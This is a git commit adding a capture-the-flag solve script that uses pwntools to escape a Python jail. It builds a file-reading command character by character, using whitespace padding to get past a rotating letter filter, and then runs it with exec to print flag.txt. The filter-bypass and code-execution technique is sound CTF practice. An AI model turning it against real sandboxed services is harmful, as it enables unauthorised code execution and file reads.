47b57b2ae8b772909c1eafff21284002f0764eee
Colin Ding <colinding10@gmail.com>
2025-06-15 22:08:40 -0400

    misc/locked-out-revenge

---
+++ locked-out/solve.py
@@ -0,0 +1,32 @@
+from pwn import *
+
+# conn = process("server.py") # use remote(HOST, PORT) for remote solve
+conn = remote("localhost", 7331) # testing with my docker
+
+command = "print(open('flag.txt').read())"
+
+conn.recvuntil(">>>")
+conn.sendline('a = ""'.encode())
+
+for char in command:
+    conn.recvuntil(">>>")
+    payload = "a+="
+    window = set("abcdefghijklm")
+    for _ in range(3):
+        window = set(chr((ord(a) - ord("a") + 1) % 26 + ord("a")) for a in window)
+    if char.isalpha():
+        while char not in window:
+            window = set(chr((ord(a) - ord("a") + 1) % 26 + ord("a")) for a in window)
+            payload += " "
+
+    payload += 25 * " "
+    payload += '"'
+    payload += char
+    payload += '"'
+
+    conn.sendline(payload.encode())
+
+conn.sendline("b =                2;exec(a)".encode())
+
+print("getting the flag now:")
+print(conn.recvline().decode().strip().replace(">>> ", ""))
